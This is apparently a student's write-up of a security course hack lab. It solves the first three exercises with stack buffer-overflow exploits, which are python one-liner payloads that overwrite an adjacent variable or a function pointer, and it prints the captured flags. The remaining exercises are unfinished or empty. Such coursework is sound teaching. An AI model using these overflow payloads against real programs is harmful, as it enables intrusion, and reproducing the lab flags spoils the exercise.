```html
<div style="page-break-after: always;"></div>
```

###### Exercise 1

> [!exercise]+ Exercise 1
> Go to /home/q1/. Exploit the program to get the secret.
> 
> **Answer:**
To exploit the program and obtain the secret, we target the buffer overflow vulnerability caused by `strcpy`. The `buffer` array has 1024 bytes, and `changeme` is immediately after it in memory. To overwrite `changeme`, our input needs to exceed the `buffer` size and alter `changeme`'s value from 0.
> 
> By supplying an input of 1028 characters, we overflow `buffer` and change at least one byte of `changeme`, triggering the conditional to reveal the secret.
>```
>student@hacklabvm:/home/q1$ ./run_me $(python -c 'print("A"*1025)')
 >_________________________________________
>/ csf2024s1_{flockwise-overdiversificatio \
>\ n-muriciform}                           /
> -----------------------------------------
>  \
>   \
>       __     
>      UooU\.'@@@@@@`.
>      \__/(@@@@@@@@@@)
>           (@@@@@@@@)
>           `YY~~~~YY'
>            ||    ||
>```

<div style="page-break-after: always;"></div>

###### Exercise 2

> [!exercise]+ Exercise 2
> Go to/ home/q2/. Exploit the program to get the secret.
> 
> **Answer:**
> This follows the same logic as exercise 1, but instead of overwriting `changeme` with anything, we need to change it to `0xabcdabcd`. Similar to before, we fill `buffer` with 1024 bytes of garbage, and now we must append `0xabcdabcd` in little endian format, i.e. `\xcd\xab\xcd\xab`.
> 
> Since we are limited to `python3`, the command is also a bit different due to the way strings are encoded.
>```
>student@hacklabvm:/home/q2$ ./run_me $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*1024 + b"\xcd\xab\xcd\xab")')
> _________________________________________
>/ csf2024s1_{salvifics-cohesionless-nondi \
>\ lation}                                 /
> -----------------------------------------
>  \
>   \
>       __     
>      UooU\.'@@@@@@`.
>      \__/(@@@@@@@@@@)
>           (@@@@@@@@)
>           `YY~~~~YY'
>            ||    ||
>```
<div style="page-break-after: always;"></div>

###### Exercise 3

> [!exercise] Exercise 3
> Go to /home/q3/. Exploit the program to get the secret.
> 
> **Answer:**
> This one is very similar to question 2. All we need to do is overwrite the unsigned int with the address of the `secret` function. We attain this by opening the binary inside `gdp` and printing the address.
> 
> ```
> (gdb) print secret
> $1 = {void ()} 0x565561ed \<secret>
> ```
> Now that we have the address, we convert it to little endian format and place it inside our payload (using the same method as question 2)
> 
> ```
> student@hacklabvm:/home/q3$ ./run_me $(python3 -c 'import sys; sys.stdout.buffer.write(b"A"*1024 + b"\xed\x61\x55\x56")')
> Jumping to function at 0x565561ed!!
>  _________________________________________
> / csf2024s1_{hiddenly-avitaminoses-diasta \
> \ lsis}                                   /
>  -----------------------------------------
>   \
>    \
>        __     
>       UooU\.'@@@@@@`.
>       \__/(@@@@@@@@@@)
>            (@@@@@@@@)
>            `YY~~~~YY'
>             ||    ||
> ```

<div style="page-break-after: always;"></div>

###### Exercise 4

> [!exercise]+ Exercise 4
> Go to /home/q4/. Exploit the program to get the secret.
> 
> **Answer:**
> Quite similar to the last question, except our input can only be less than 100 characters. Because `sprintf` is used instead of `strcpy`, we can get around this limitation by padding the input inside this function, rather than through python.



<div style="page-break-after: always;"></div>


###### Exercise 5

<div style="page-break-after: always;"></div>

###### Exercise 6

<div style="page-break-after: always;"></div>

###### Exercise 7

<div style="page-break-after: always;"></div>

###### Exercise 8

<div style="page-break-after: always;"></div>

###### Exercise 9

<div style="page-break-after: always;"></div>

###### Exercise 10







